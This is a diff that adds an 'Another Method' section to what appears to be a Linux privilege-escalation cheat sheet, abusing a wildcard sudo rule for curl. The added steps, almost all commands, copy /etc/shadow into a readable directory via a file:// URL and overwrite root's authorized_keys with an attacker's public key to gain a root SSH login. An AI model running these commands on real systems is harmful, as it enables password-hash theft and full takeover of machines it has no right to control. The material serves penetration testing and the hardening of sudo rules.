@@ -47,3 +47,43 @@ whoami
 id
 ```
 
+# Another Method
+If you can run curl as root, example:
+```
+(root) NOPASSWD: /usr/bin/curl 127.0.0.1:8000/health-check*
+```
+
+The asteris at the end means anything can be added afterwards.
+So we can run the follwing command and save the output.
+
+First start a http server in /tmp/srv directory:
+```
+cd /tmp
+mkdir srv
+cd srv
+python -m http.server
+```
+
+Now in another terminal run:
+```
+sudo -u root curl 127.0.0.1:8000/health-check file:///etc/shadow -o /tmp/srv/log -o /tmp/srv/data
+```
+This should save the shadow file to the filename data on the /tmp/srv/ dir.
+
+You can now try to put your public SSH keys in 127.0.0.1:8000/health_check file and the download it but save it to root's auzorised keys.
+
+```
+sudo -u root curl http://127.0.0.1:8000/health-check -o /root/.ssh/authorized_keys
+```
+
+You should be able to ssh to root using the ssh keys:
+```
+ssh root@localhost
+```
+
+Or you can also specify the keys
+```
+ssh -i rsa_id root@localhost
+```
+
+You should be root now.
